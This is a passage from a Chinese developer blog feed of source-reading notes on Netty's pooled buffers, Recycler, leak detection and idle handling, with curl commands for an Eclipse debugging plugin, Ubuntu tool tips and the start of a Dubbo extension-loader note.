<span class="hljs-keyword">if</span> (id &lt; <span class="hljs-number">0</span>) &#123;            <span class="hljs-keyword">return</span> id;        &#125;        <span class="hljs-keyword">final</span> PoolSubpage&lt;T&gt;[] subpages = <span class="hljs-keyword">this</span>.subpages;        <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> pageSize = <span class="hljs-keyword">this</span>.pageSize;        freeBytes -= pageSize;        <span class="hljs-keyword">int</span> subpageIdx = subpageIdx(id);        PoolSubpage&lt;T&gt; subpage = subpages[subpageIdx];        <span class="hljs-keyword">if</span> (subpage == <span class="hljs-keyword">null</span>) &#123;            subpage = <span class="hljs-keyword">new</span> PoolSubpage&lt;T&gt;(head, <span class="hljs-keyword">this</span>, id, runOffset(id), pageSize, normCapacity); <span class="hljs-comment">// 此处会将新新构建出来的PoolSubpage实例加到head的next节点</span>            subpages[subpageIdx] = subpage;        &#125; <span class="hljs-keyword">else</span> &#123;            subpage.init(head, normCapacity);        &#125;        <span class="hljs-keyword">return</span> subpage.allocate();    &#125;&#125;</code></pre><h3 id="PoolArenad的cache与Recycler对象池"><a href="#PoolArenad的cache与Recycler对象池" class="headerlink" title="PoolArenad的cache与Recycler对象池"></a>PoolArenad的cache与Recycler对象池</h3><p>PooledByteBuf依赖PoolThreadCache做了一层对PoolChunk的缓存,PoolThreadCache靠MemoryRegionCache实现缓存。MemoryRegionCache靠队列来实现对PoolChunk的缓存(参见下面代码1)，MemoryRegionCache在buf释放时会调用其add接口将释放的PoolChunk对象和nioBuffer对象通过io.netty.buffer.PoolThreadCache.MemoryRegionCache.Entry<T>对象包装后加入(offer)到队列(参见下面堆栈1)。在io.netty.buffer.PoolThreadCache.MemoryRegionCache.allocate(PooledByteBuf<T>, int)时再从队列中直接poll出来，达成cache的目的。优化还没有结束，包装PoolChunk用的Entry对象是通过<code>Recycler</code>对象池完成分配(获取)已释放的。对象是本质上一个通过FastThreadLocal的Stack的数据结构，分配对应出栈，释放对象入栈。具体参见下面代码2。<br>Recycler<PooledUnsafeDirectByteBuf><br>是一个基于ThreadLocal结合stack玩起来的一个对象池数据结构，像上述这种就是PooledUnsafeDirectByteBuf的对象pool。回收的时候压栈，要用的时候出栈。<br>获取对象  io.netty.util.Recycler.get()<br>回收对象  io.netty.util.Recycler.DefaultHandle.recycle(Object)   </p><p>代码1： 队列初始化  </p><pre><code class="hljs java">Queue&lt;Entry&lt;T&gt;&gt; queue = PlatformDependent.newFixedMpscQueue(<span class="hljs-keyword">this</span>.size);</code></pre><p>堆栈1：buf释放时会调用MemoryRegionCache add接口将释放的PoolChunk对象包装后入队：  </p><pre><code class="hljs java">Thread [main] (Suspended (breakpoint at line <span class="hljs-number">393</span> in PoolThreadCache$MemoryRegionCache))PoolThreadCache$SubPageMemoryRegionCache&lt;T&gt;(PoolThreadCache$MemoryRegionCache&lt;T&gt;).add(PoolChunk&lt;T&gt;, ByteBuffer, <span class="hljs-keyword">long</span>) line: <span class="hljs-number">393</span>PoolThreadCache.add(PoolArena&lt;?&gt;, PoolChunk, ByteBuffer, <span class="hljs-keyword">long</span>, <span class="hljs-keyword">int</span>, SizeClass) line: <span class="hljs-number">209</span>PoolArena$DirectArena(PoolArena&lt;T&gt;).free(PoolChunk&lt;T&gt;, ByteBuffer, <span class="hljs-keyword">long</span>, <span class="hljs-keyword">int</span>, PoolThreadCache) line: <span class="hljs-number">273</span>PooledUnsafeDirectByteBuf(PooledByteBuf&lt;T&gt;).deallocate() line: <span class="hljs-number">171</span>PooledUnsafeDirectByteBuf(AbstractReferenceCountedByteBuf).release0(<span class="hljs-keyword">int</span>) line: <span class="hljs-number">136</span>PooledUnsafeDirectByteBuf(AbstractReferenceCountedByteBuf).release() line: <span class="hljs-number">124</span>PooledByteBufTest.main(String[]) line: <span class="hljs-number">43</span></code></pre><p>代码2：Entry对象使用对象池    </p><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> Recycler&lt;Entry&gt; RECYCLER = <span class="hljs-keyword">new</span> Recycler&lt;Entry&gt;() &#123;    <span class="hljs-meta">@SuppressWarnings</span>(<span class="hljs-string">"unchecked"</span>)    <span class="hljs-meta">@Override</span>    <span class="hljs-function"><span class="hljs-keyword">protected</span> Entry <span class="hljs-title">newObject</span><span class="hljs-params">(Handle&lt;Entry&gt; handle)</span> </span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> Entry(handle);    &#125;&#125;;<span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Entry <span class="hljs-title">newEntry</span><span class="hljs-params">(PoolChunk&lt;?&gt; chunk, ByteBuffer nioBuffer, <span class="hljs-keyword">long</span> handle)</span> </span>&#123;    Entry entry = RECYCLER.get();    entry.chunk = chunk;    entry.nioBuffer = nioBuffer;    entry.handle = handle;    <span class="hljs-keyword">return</span> entry;&#125;<span class="hljs-meta">@Override</span><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">recycle</span><span class="hljs-params">(Object object)</span> </span>&#123;    <span class="hljs-keyword">if</span> (object != value) &#123;        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IllegalArgumentException(<span class="hljs-string">"object does not belong to handle"</span>);    &#125;    Stack&lt;?&gt; stack = <span class="hljs-keyword">this</span>.stack;    <span class="hljs-keyword">if</span> (lastRecycledId != recycleId || stack == <span class="hljs-keyword">null</span>) &#123;        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IllegalStateException(<span class="hljs-string">"recycled already"</span>);    &#125;    stack.push(<span class="hljs-keyword">this</span>);&#125;</code></pre><h3 id="PooledByteBufAllocator创建及其关联细节"><a href="#PooledByteBufAllocator创建及其关联细节" class="headerlink" title="PooledByteBufAllocator创建及其关联细节"></a>PooledByteBufAllocator创建及其关联细节</h3><ol><li>PooledByteBufAllocator validateAndCalculateChunkSize 校验树高度不能超过14，且根据pageSize(可以外部指定)和树高计算出chunksize</li><li>PooledByteBufAllocator validateAndCalculatePageShifts 校验pageSize最小不能小于4K，且pageSize必须是2的整数次方((pageSize &amp; pageSize - 1) != 0) （为什么(pageSize &amp; pageSize - 1) != 0能判断？因为2的n次方的二进制形式一定是第一位1后面接n个0，减1后就变成第一位0后面接n个1，相与之后一定是0；如果不是2的n次方的数的二进制形式一定是第一位是1，且，这个数减去1后，第一位一定还是1，因为第一位是1且后面全接0的数一定是2的整数次方的，那么不是2的整数次方的数后面一定不全是0，所以减去1后第一位肯定还是1，所以不管后面接的这些数相与是怎样的结果，第一位两个1相与出来肯定是1，肯定不为0，所以能用这个办法判断）</li><li>创建tinySubpagePools数组并初始化里面的元素，默认数组大小32个，里面的元素是PoolSubpage，PoolSubpage还支持链式形式连接(他有前继和后继)</li></ol><h3 id="PoolChunk-分配与释放小于pagesize的buf"><a href="#PoolChunk-分配与释放小于pagesize的buf" class="headerlink" title="PoolChunk 分配与释放小于pagesize的buf"></a>PoolChunk 分配与释放小于pagesize的buf</h3><p>io.netty.buffer.PoolArena.free(PoolChunk<T>, ByteBuffer, long, int, PoolThreadCache)<br>位图相关：  </p><pre><code class="hljs java"><span class="hljs-comment">// long64位 取 高32位转成整数</span><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">bitmapIdx</span><span class="hljs-params">(<span class="hljs-keyword">long</span> handle)</span> </span>&#123;        <span class="hljs-keyword">return</span> (<span class="hljs-keyword">int</span>) (handle &gt;&gt;&gt; Integer.SIZE);    &#125;</code></pre><p>PoolSubpage 支持位图<br>一个page 8192大小 一个块(element)大小32，那么一个page可以拆成256个，每申请一次numAvail减去1。<br>long型位图数组中有个8个元素，8192/16/64=8, 64是long的位数,。</p><p>分配时bitmap中元素，以第一个元素为例子，按1 3 7 15 31 63 127网上涨，释放的时候按对应数据往下减，并且在释放时记录nextAvail值，便于下次申请时优先使用。<br>bitmap中的4个(bitmapLength)long来维护256个（maxNumElems=pageSize/elemSize）块是否使用的情况。  </p><pre><code class="hljs java"><span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PoolSubpage</span>&lt;<span class="hljs-title">T</span>&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title">PoolSubpageMetric</span> </span>&#123;    <span class="hljs-keyword">final</span> PoolChunk&lt;T&gt; chunk;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> memoryMapIdx;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> runOffset;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> pageSize;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">long</span>[] bitmap;  <span class="hljs-comment">// 位图...,默认有8个元素 个数= pagesize &gt;&gt;&gt; 10 （pagesize / 16 / 64）64应该是long的位数，16是啥？一个element算256。 实际这个数组默认只用4个元素</span>    PoolSubpage&lt;T&gt; prev;    PoolSubpage&lt;T&gt; next;    <span class="hljs-keyword">boolean</span> doNotDestroy;    <span class="hljs-keyword">int</span> elemSize;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> maxNumElems; <span class="hljs-comment">// 一个page再分maxNumElems分  默认是256</span>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> bitmapLength; <span class="hljs-comment">// 默认是4  256 &gt;&gt;&gt; 6 = 4</span>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> nextAvail; <span class="hljs-comment">// 在有buf释放时会设置这个值，以使得他们在下次分配时优先使用这个</span>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> numAvail;        <span class="hljs-function"><span class="hljs-keyword">long</span> <span class="hljs-title">allocate</span><span class="hljs-params">()</span> </span>&#123;        <span class="hljs-keyword">if</span> (elemSize == <span class="hljs-number">0</span>) &#123;            <span class="hljs-keyword">return</span> toHandle(<span class="hljs-number">0</span>);        &#125;        <span class="hljs-keyword">if</span> (numAvail == <span class="hljs-number">0</span> || !doNotDestroy) &#123;            <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;        &#125;        <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> bitmapIdx = getNextAvail();        <span class="hljs-keyword">int</span> q = bitmapIdx &gt;&gt;&gt; <span class="hljs-number">6</span>;        <span class="hljs-keyword">int</span> r = bitmapIdx &amp; <span class="hljs-number">63</span>;        <span class="hljs-keyword">assert</span> (bitmap[q] &gt;&gt;&gt; r &amp; <span class="hljs-number">1</span>) == <span class="hljs-number">0</span>;        bitmap[q] |= <span class="hljs-number">1L</span> &lt;&lt; r;  <span class="hljs-comment">// 按1 3 7 15 31 63 127往上涨</span>        <span class="hljs-keyword">if</span> (-- numAvail == <span class="hljs-number">0</span>) &#123;            removeFromPool();        &#125;        <span class="hljs-keyword">return</span> toHandle(bitmapIdx);    &#125;            <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> <span class="hljs-title">findNextAvail</span><span class="hljs-params">()</span> </span>&#123;        <span class="hljs-keyword">final</span> <span class="hljs-keyword">long</span>[] bitmap = <span class="hljs-keyword">this</span>.bitmap;        <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> bitmapLength = <span class="hljs-keyword">this</span>.bitmapLength;        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; bitmapLength; i ++) &#123;            <span class="hljs-keyword">long</span> bits = bitmap[i];            <span class="hljs-keyword">if</span> (~bits != <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">// 这个表示这个long上是否所有的位都用完了。。</span>                <span class="hljs-keyword">return</span> findNextAvail0(i, bits);            &#125;        &#125;        <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;    &#125;        <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> <span class="hljs-title">findNextAvail0</span><span class="hljs-params">(<span class="hljs-keyword">int</span> i, <span class="hljs-keyword">long</span> bits)</span> </span>&#123;        <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> maxNumElems = <span class="hljs-keyword">this</span>.maxNumElems;        <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> baseVal = i &lt;&lt; <span class="hljs-number">6</span>;        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">64</span>; j ++) &#123;            <span class="hljs-keyword">if</span> ((bits &amp; <span class="hljs-number">1</span>) == <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">// 判断是否是偶数</span>                <span class="hljs-keyword">int</span> val = baseVal | j;                <span class="hljs-keyword">if</span> (val &lt; maxNumElems) &#123;                    <span class="hljs-keyword">return</span> val;                &#125; <span class="hljs-keyword">else</span> &#123;                    <span class="hljs-keyword">break</span>;                &#125;            &#125;            bits &gt;&gt;&gt;= <span class="hljs-number">1</span>; <span class="hljs-comment">// 除以2 并向靠近的2的整数次幂对齐</span>        &#125;        <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;    &#125;</code></pre><p>free时不是每次都会真正释放，在下面会先加入到MemoryRegionCache的queue中cache起来，当queue中放不下时才真正free，代码如下：  </p><pre><code class="hljs java"><span class="hljs-comment">// PoolArena.class</span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">free</span><span class="hljs-params">(PoolChunk&lt;T&gt; chunk, ByteBuffer nioBuffer, <span class="hljs-keyword">long</span> handle, <span class="hljs-keyword">int</span> normCapacity, PoolThreadCache cache)</span> </span>&#123;    <span class="hljs-keyword">if</span> (chunk.unpooled) &#123;        <span class="hljs-keyword">int</span> size = chunk.chunkSize();        destroyChunk(chunk);        activeBytesHuge.add(-size);        deallocationsHuge.increment();    &#125; <span class="hljs-keyword">else</span> &#123;        SizeClass sizeClass = sizeClass(normCapacity);        <span class="hljs-keyword">if</span> (cache != <span class="hljs-keyword">null</span> &amp;&amp; cache.add(<span class="hljs-keyword">this</span>, chunk, nioBuffer, handle, normCapacity, sizeClass)) &#123;            <span class="hljs-comment">// cached so not free it.</span>            <span class="hljs-keyword">return</span>;        &#125;        freeChunk(chunk, handle, sizeClass, nioBuffer);    &#125;&#125;</code></pre>]]></content>
    
    
    <categories>
      
      <category>opensource-code-study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>netty4源码分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>netty之ResourceLeakDetector的使用与实现</title>
    <link href="/2020/04/20/netty4-resource-leak-detector-impl/"/>
    <url>/2020/04/20/netty4-resource-leak-detector-impl/</url>
    
    <content type="html"><![CDATA[<p>通过<strong>WeakReference和ReferenceQueue</strong>做针对<strong>需要手动释放</strong>的资源的侦测  </p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><ol><li>设置日志级别：  <pre><code class="hljs java">ServerBootstrap b =<span class="hljs-keyword">new</span> ServerBootstrap();b.group(bossGroup,workerGroup).channel(NioServerSocketChannel<span class="hljs-class">.<span class="hljs-keyword">class</span>)</span><span class="hljs-class">.<span class="hljs-title">option</span>(<span class="hljs-title">ChannelOption</span>.<span class="hljs-title">SO_BACKLOG</span>, 2048)</span><span class="hljs-class">.<span class="hljs-title">handler</span>(<span class="hljs-title">new</span> <span class="hljs-title">LoggingHandler</span>(<span class="hljs-title">LogLevel</span>.<span class="hljs-title">DEBUG</span>))</span><span class="hljs-class">.<span class="hljs-title">childHandler</span>(<span class="hljs-title">new</span> <span class="hljs-title">ChildChannelHandler</span>())</span>;<span class="hljs-number">2017</span>-<span class="hljs-number">01</span>-<span class="hljs-number">19</span> <span class="hljs-number">10</span>:<span class="hljs-number">04</span>:<span class="hljs-number">49</span>  [ nioEventLoopGroup-<span class="hljs-number">1</span>-<span class="hljs-number">0</span>:<span class="hljs-number">1628830</span> ] - [ ERROR ]  LEAK: ByteBuf.release() was not called before it<span class="hljs-string">'s garbage-coll...</span></code></pre></li><li>ResourceLeakDetector.setLevel(ResourceLeakDetector.Level.ADVANCED);或者通过JVM参数配置<br>日志：  <pre><code class="hljs java"><span class="hljs-number">2017</span>-<span class="hljs-number">01</span>-<span class="hljs-number">19</span> <span class="hljs-number">10</span>:<span class="hljs-number">35</span>:<span class="hljs-number">59</span>  [ nioEventLoopGroup-<span class="hljs-number">1</span>-<span class="hljs-number">0</span>:<span class="hljs-number">665092</span> ] - [ ERROR ]  LEAK: ByteBuf.release() was not called before it<span class="hljs-string">'s garbage-collected. See http://netty.io/wiki/reference-counted-objects.html for more information.</span><span class="hljs-string">Recent access records: 5</span><span class="hljs-string">#5:</span><span class="hljs-string">    io.netty.buffer.AdvancedLeakAwareByteBuf.readBytes(AdvancedLeakAwareByteBuf.java:435)</span></code></pre></li></ol><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>[ ERROR ]  LEAK:   </p><pre><code class="hljs java"><span class="hljs-comment">// ResourceLeakDetector</span><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">reportTracedLeak</span><span class="hljs-params">(String resourceType, String records)</span> </span>&#123;    logger.error(            <span class="hljs-string">"LEAK: &#123;&#125;.release() was not called before it's garbage-collected. "</span> +            <span class="hljs-string">"See http://netty.io/wiki/reference-counted-objects.html for more information.&#123;&#125;"</span>,            resourceType, records);&#125;<span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">reportLeak</span><span class="hljs-params">()</span> </span>&#123;    <span class="hljs-keyword">if</span> (!logger.isErrorEnabled()) &#123;        clearRefQueue();        <span class="hljs-keyword">return</span>;    &#125;    <span class="hljs-comment">// Detect and report previous leaks.</span>    <span class="hljs-keyword">for</span> (;;) &#123;        <span class="hljs-meta">@SuppressWarnings</span>(<span class="hljs-string">"unchecked"</span>)        DefaultResourceLeak ref = (DefaultResourceLeak) refQueue.poll(); <span class="hljs-comment">// 为什么能拿到？什么时候 放进去的？是weakreference回收过程中放进去的，相当于GC过程让你插入hook。那为什么被GC了还有资源泄露呢？这个问题其实是这样的，泄露是池化内存等那些需要手动释放资源。</span>        <span class="hljs-keyword">if</span> (ref == <span class="hljs-keyword">null</span>) &#123;            <span class="hljs-keyword">break</span>;        &#125;        <span class="hljs-keyword">if</span> (!ref.dispose()) &#123; <span class="hljs-comment">// return allLeaks.remove(this); 所以当有人显式释放过，那么此处就返回false 就不会往下走report了</span>            <span class="hljs-keyword">continue</span>;        &#125;        String records = ref.toString();        <span class="hljs-keyword">if</span> (reportedLeaks.putIfAbsent(records, Boolean.TRUE) == <span class="hljs-keyword">null</span>) &#123;            <span class="hljs-keyword">if</span> (records.isEmpty()) &#123;                reportUntracedLeak(resourceType);            &#125; <span class="hljs-keyword">else</span> &#123;                reportTracedLeak(resourceType, records);            &#125;        &#125;    &#125;&#125;</code></pre><h3 id="基本实现原理"><a href="#基本实现原理" class="headerlink" title="基本实现原理"></a>基本实现原理</h3><ol><li>通过DefaultResourceLeak继承自WeakReference，借助WeakReference的GC特性完成。WeakReference的GC特性是当这个对象没有被其他强引用对象引用时，仅仅被WeakReference引用(或者其他weak引用)时，会在下一次GC时回收，回收过程中会将被回收的引用放到ReferenceQueue中。此处的ReferenceQueue又是在创建DefaultResourceLeak时通过构造参数传入的。</li><li>不时poll那个ReferenceQueue队列，当拿到对象时看起dispose是否被调用过，如果没有则证明没有显示释放，则report出来。  </li><li>每次创建池化buf对象时，便会创建DefaultResourceLeak，并在touch等API中调用其record方法，追踪其申请使用的地方。在开启了泄露追踪后，buf会被包装，比如包装成AdvancedLeakAwareByteBuf。    </li><li>侦测reportLeak不是每次都调用，当小雨PARANOID级别是在申请buf时按随机数比例调。PARANOID级别是全调。</li></ol><p>此处资源泄露，是指那种需要手动释放的资源，因为引用他的对象已经不在程序逻辑中使用了，那么最终会被GC回收，但是那种需要手动释放的资源不显式释放就泄露了。比如内存池，比方说里面有5个杯子，你用的buf指向一个杯子被你占着，你不用时没显式告诉内存池说这个杯子不用了，那么就一直占着，但是buf对象不用了会被GC回收，那么此时内存池资源就泄露了。</p>]]></content>
    
    
    <categories>
      
      <category>opensource-code-study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>netty4源码分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>netty之idle handler处理</title>
    <link href="/2020/04/20/netty4-idle-handler/"/>
    <url>/2020/04/20/netty4-idle-handler/</url>
    
    <content type="html"><![CDATA[<ol><li>初始化时记录idle时间，并启动一个延时任务，延时时间为idle时间，延时任务是io.netty.handler.timeout.IdleStateHandler.AllIdleTimeoutTask  </li><li>channelReadComplete 会更新lastReadTime，lastWriteTime是在write操作返回的ChannelFuture实例上挂上listener监听operationComplete动作来更新的，详细参见io.netty.handler.timeout.IdleStateHandler.writeListener</li><li>AllIdleTimeoutTask 任务逻辑中会取lastReadTime, lastWriteTime大值，并拿nextDelay减去他们，这样就能得到下次任务要延期多就检查执行。    </li></ol><p>比如一开始是10：00，5分钟idle时间，那么会在10：05时检查(延迟5分钟)，如果在10：04发生了读写，那么在10：05检查时算出下一次延迟启动任务是4分钟后即10：09分。 </p><p>读写超时是基于此做的事件，检查机制类似。<br>且在netty4中未使用 HashedWheelTimer，而是在线NioEventLoop的spin loop中完成触发。在spin loop中会从io.netty.util.concurrent.AbstractScheduledEventExecutor.scheduledTaskQueue中peek出最前面(也是最早到达的定时任务)的看其deadline是否小于当前时间，如果是则执行。<br>HashedWheelTimer是在netty3中用来做idle检测的。</p>]]></content>
    
    
    <categories>
      
      <category>opensource-code-study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>netty4源码分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>可以用命令行控制eclipse断点增加删除、远程调试创建与启动的插件</title>
    <link href="/2020/04/20/use-curl-to-manage-breakpoint-on-eclipse/"/>
    <url>/2020/04/20/use-curl-to-manage-breakpoint-on-eclipse/</url>
    
    <content type="html"><![CDATA[<h2 id="java"><a href="#java" class="headerlink" title="java"></a>java</h2><pre><code class="hljs bash"><span class="hljs-comment"># 创建断点(支持条件断点)</span>curl  -X PUT -H <span class="hljs-string">"Content-Type:application/json"</span> --data <span class="hljs-string">'&#123;"language":"java","condition":"i == 1","charStart":283,"charEnd":307,"lineNumber":16,"typeName":"com.code260.tools.redstar.dp.java.TestStub","hitCount":-1,"projectName":"test-debug","filePath":"/src/com/code260/tools/redstar/dp/java/TestStub.java"&#125;'</span> http://127.0.0.1:8884/redstar/breakpoint/java<span class="hljs-comment"># 删除断点</span>curl  -X DELETE -H <span class="hljs-string">"Content-Type:application/json"</span> --data <span class="hljs-string">'&#123;"language":"java","condition":"i == 1","charStart":283,"charEnd":307,"lineNumber":16,"typeName":"com.code260.tools.redstar.dp.java.TestStub","hitCount":-1,"projectName":"test-debug","filePath":"/src/com/code260/tools/redstar/dp/java/TestStub.java"&#125;'</span> http://127.0.0.1:8884/redstar/breakpoint/java<span class="hljs-comment"># 创建远程调试</span>curl  -X PUT -H <span class="hljs-string">"Content-Type:application/json"</span> --data <span class="hljs-string">'&#123;"name":"tes-debug-001","hostname":"127.0.0.1","port":8501,"projectName":"test-debug","vmConnector":"org.eclipse.jdt.launching.socketAttachConnector","allowTerminal":false&#125;'</span> http://127.0.0.1:8884/redstar/launch-debug/java<span class="hljs-comment"># 启动远程调试</span>curl  -X POST -H <span class="hljs-string">"Content-Type:application/json"</span> --data <span class="hljs-string">'&#123;"name":"tes-debug-001"&#125;'</span> http://127.0.0.1:8884/redstar/launch-debug/java<span class="hljs-comment"># 查询所有断点</span>curl http://127.0.0.1:8884/redstar/breakpoint/java<span class="hljs-comment"># 监听断点事件</span>curl http://127.0.0.1:8884/redstar/debug-event/java/watch<span class="hljs-comment"># 放掉一个断点</span>curl  -X POST -H <span class="hljs-string">"Content-Type:application/json"</span> --data <span class="hljs-string">'&#123;"launchName":"tes-debug-001", "threadName":"main"&#125;'</span> http://127.0.0.1:8884/redstar/breakpoint/java/resume<span class="hljs-comment"># inspect一个表达式</span>curl  -X POST -H <span class="hljs-string">"Content-Type:application/json"</span> --data <span class="hljs-string">'&#123;"launchName":"tes-debug-001", "threadName":"main", "expression":"i=i+5","projectName":"test-debug"&#125;'</span> http://127.0.0.1:8884/redstar/debug-event/java/inspect</code></pre><h2 id="scala"><a href="#scala" class="headerlink" title="scala"></a>scala</h2><pre><code class="hljs bash"><span class="hljs-comment"># 创建断点(支持条件断点)</span>curl  -X PUT -H <span class="hljs-string">"Content-Type:application/json"</span> --data <span class="hljs-string">'&#123;"language":"scala","condition":"","charStart":-1,"charEnd":-1,"lineNumber":6,"typeName":"testpkg.TestObject","hitCount":-1,"projectName":"test-scala","filePath":"/src/testpkg/TestObject.scala"&#125;'</span> http://127.0.0.1:8884/redstar/breakpoint/java<span class="hljs-comment"># 删除断点</span>curl  -X DELETE -H <span class="hljs-string">"Content-Type:application/json"</span> --data <span class="hljs-string">'&#123;"language":"scala","condition":"i == 1","charStart":-1,"charEnd":-1,"lineNumber":6,"typeName":"testpkg.TestObject","hitCount":-1,"projectName":"test-scala","filePath":"/src/testpkg/TestObject.scala"&#125;'</span> http://127.0.0.1:8884/redstar/breakpoint/java<span class="hljs-comment"># 创建远程调试</span>curl  -X PUT -H <span class="hljs-string">"Content-Type:application/json"</span> --data <span class="hljs-string">'&#123;"name":"tes-debug-001","hostname":"127.0.0.1","port":8500,"projectName":"test-scala","vmConnector":"org.scala-ide.sdt.debug.socketAttachConnector","allowTerminal":false&#125;'</span> http://127.0.0.1:8884/redstar/launch-debug/java<span class="hljs-comment"># 启动远程调试</span>curl  -X POST -H <span class="hljs-string">"Content-Type:application/json"</span> --data <span class="hljs-string">'&#123;"name":"tes-debug-001"&#125;'</span> http://127.0.0.1:8884/redstar/launch-debug/java<span class="hljs-comment"># 查询所有断点</span>curl http://127.0.0.1:8884/redstar/breakpoint/java<span class="hljs-comment"># 监听断点事件</span>curl http://127.0.0.1:8884/redstar/debug-event/java/watch<span class="hljs-comment"># 放掉一个断点</span>curl  -X POST -H <span class="hljs-string">"Content-Type:application/json"</span> --data <span class="hljs-string">'&#123;"launchName":"tes-debug-001", "threadName":"main"&#125;'</span> http://127.0.0.1:8884/redstar/breakpoint/java/resume<span class="hljs-comment"># inspect一个表达式</span>curl  -X POST -H <span class="hljs-string">"Content-Type:application/json"</span> --data <span class="hljs-string">'&#123;"launchName":"tes-debug-001", "threadName":"main", "expression":"i=i+5","projectName":"test-debug"&#125;'</span> http://127.0.0.1:8884/redstar/debug-event/java/inspect</code></pre><p><a href="https://files.cnblogs.com/files/simoncook/redstar-dp-java-eclipse-site.zip" target="_blank" rel="noopener">插件下载地址</a></p>]]></content>
    
    
    <categories>
      
      <category>program-language-practice</category>
      
    </categories>
    
    
    <tags>
      
      <tag>dev-tools</tag>
      
      <tag>eclipse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ubuntu开发机所需工具，做个记录，不断补充</title>
    <link href="/2020/04/20/dev-tools-on-ubuntu/"/>
    <url>/2020/04/20/dev-tools-on-ubuntu/</url>
    
    <content type="html"><![CDATA[<h3 id="文件搜索"><a href="#文件搜索" class="headerlink" title="文件搜索"></a>文件搜索</h3><p>FSearch 用了下可以， 类似windows下的Everything 或者mac的cmd+空格<br><a href="https://github.com/cboxdoerfer/fsearch" target="_blank" rel="noopener">地址</a><br>安装：  </p><blockquote><p>sudo add-apt-repository ppa:christian-boxdoerfer/fsearch-daily<br>sudo apt-get update<br>sudo apt install fsearch-trunk  </p></blockquote><p>subl 1.txt   sublime比自带gedit顺手  </p><p>nautilus ./ 启动文件浏览器  </p>]]></content>
    
    
    <categories>
      
      <category>program-language-practice</category>
      
    </categories>
    
    
    <tags>
      
      <tag>dev-tools</tag>
      
      <tag>ubutnu</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于dubbo扩展点的一点分析</title>
    <link href="/2020/04/20/about-dubbo-extension-loader/"/>
    <url>/2020/04/20/about-dubbo-extension-loader/</url>
    
    <content type="html"><![CDATA[<h2 id="扩展点能力"><a href="#扩展点能力" class="headerlink" title="扩展点能力"></a>扩展点能力</h2><ol><li>能load class，这个class除了顶层接口class（在ExtensionLoader中对应type字段），还能load各实现类的class。</li><li>能创建instance。</li><li>能指定这个顶层接口的默认实现类的beanName。做法参见SPI注解部分。</li><li>能把创建出来的instance的字段注入。set开头的且有一个参数且是public的，注入。  </li><li>能adaptive。根据url上对该接口配置的实现类，将该接口的事情交给这个实现类去做(我更多的理解成委托)。此能力采用代码生成再编译的方式。代码生成示例可以参见adaptive类代码示例。 adaptive只会生成一个adaptive实现类。生成代码的逻辑在com.alibaba.dubbo.common.extension.ExtensionLoader.createAdaptiveExtensionClassCode()  </li><li>能wrapper。wrapper是指这个顶层接口的实现类的构造函数的入参是这个顶层接口类型。那么这个实现类称之为wrapper类，可以有多个，构建instance时不分多个之间的顺序。因为用来给构造函数传参的instance是这个顶层类的默认实现。比如com.alibaba.dubbo.rpc.Protocol接口，有实现类 com.alibaba.dubbo.rpc.protocol.injvm.InjvmProtocol beanName是injvm，QosProtocolWrapper、ProtocolListenerWrapper、ProtocolFilterWrapper是其三个wrapper类。创建warpper instance的代码逻辑在com.alibaba.dubbo.common.extension.ExtensionLoader.createExtension(String)中。  